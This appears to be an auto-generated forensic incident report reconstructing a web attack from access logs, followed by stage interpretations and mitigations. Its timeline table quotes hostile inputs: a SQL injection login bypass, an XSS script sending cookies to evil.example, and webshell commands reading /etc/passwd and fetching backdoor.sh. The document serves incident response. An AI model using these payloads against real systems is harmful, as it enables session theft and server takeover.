# AttackTrace - Forensic Incident Report

Total log entries analyzed: **156**
Suspicious entries flagged: **15**

## 1. Suspicious Source IP Ranking

| IP Address | Total Flags | Categories Triggered |
|---|---|---|
| 45.33.32.156 | 20 | RECON(7), UPLOAD(7), SQLI(1), XSS(1), RCE(4) |

**Primary suspect IP:** `45.33.32.156` (highest and most varied suspicious activity)

## 2. Reconstructed Attack Timeline

| Time | Method | Path | Status | Categories |
|---|---|---|---|---|
| 20/Sep/2026:08:41:20 +0000 | GET | `/admin/` | 404 | RECON |
| 20/Sep/2026:08:41:22 +0000 | GET | `/wp-login.php` | 404 | RECON |
| 20/Sep/2026:08:41:25 +0000 | GET | `/phpmyadmin/` | 404 | RECON |
| 20/Sep/2026:08:41:26 +0000 | GET | `/backup.zip` | 404 | RECON |
| 20/Sep/2026:08:41:31 +0000 | GET | `/.git/config` | 404 | RECON |
| 20/Sep/2026:08:41:33 +0000 | GET | `/config.php.bak` | 404 | RECON |
| 20/Sep/2026:08:41:35 +0000 | GET | `/uploads/` | 404 | RECON, UPLOAD |
| 20/Sep/2026:08:42:12 +0000 | GET | `/login.php?username=admin'--&password=x` | 302 | SQLI |
| 20/Sep/2026:08:43:05 +0000 | POST | `/comment.php?text=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil.example%2Fc%3F%27%2Bdocument.cookie%3C%2Fscript%3E` | 200 | XSS |
| 20/Sep/2026:08:49:27 +0000 | POST | `/upload.php` | 200 | UPLOAD |
| 20/Sep/2026:08:49:29 +0000 | GET | `/uploads/shell.php.jpg` | 200 | UPLOAD |
| 20/Sep/2026:08:49:49 +0000 | GET | `/uploads/shell.php.jpg?cmd=whoami` | 200 | UPLOAD, RCE |
| 20/Sep/2026:08:49:56 +0000 | GET | `/uploads/shell.php.jpg?cmd=id` | 200 | UPLOAD, RCE |
| 20/Sep/2026:08:50:03 +0000 | GET | `/uploads/shell.php.jpg?cmd=cat+/etc/passwd` | 200 | UPLOAD, RCE |
| 20/Sep/2026:08:50:10 +0000 | GET | `/uploads/shell.php.jpg?cmd=wget+http://evil.example/backdoor.sh` | 200 | UPLOAD, RCE |

## 3. Attack Stage Interpretation

- **Reconnaissance** - attacker probed for admin panels, backups, or exposed config/version-control files.
- **SQL Injection** - attacker attempted to manipulate database queries, likely to bypass authentication or exfiltrate data (note any `UNION SELECT` / `information_schema` usage, which indicates schema enumeration or data theft).
- **Cross-Site Scripting** - attacker injected script content, likely to steal session cookies from a victim who later views the affected page.
- **Malicious File Upload** - attacker uploaded a file with a suspicious name/extension pattern (commonly used to disguise a webshell, e.g. `shell.php.jpg`).
- **Post-Exploitation / Remote Code Execution** - attacker used an uploaded webshell to execute commands on the server (evidence of commands like `whoami`, `id`, or reading `/etc/passwd`).

## 4. Recommended Mitigations

- Return generic 404s and avoid exposing `.git`, backup files, or default admin paths publicly.
- Use parameterized queries / prepared statements everywhere; deploy a WAF rule for `UNION SELECT` and comment-based injection patterns.
- Sanitize and encode all user-supplied input before rendering; set a strict Content-Security-Policy header; use `HttpOnly` and `Secure` cookie flags.
- Validate file type by content (magic bytes), not extension; store uploads outside the web root; disable script execution in the uploads directory.
- Restrict outbound connections from the web server; monitor for unexpected child processes spawned by the web server user; apply least-privilege file permissions.

## 5. Evidence Notes

- This timeline was reconstructed purely from web server access log entries.
- For a complete investigation, also collect: database query logs, file system timestamps on the uploads directory, and (if available) a memory dump analyzed with Volatility for any live malicious process.
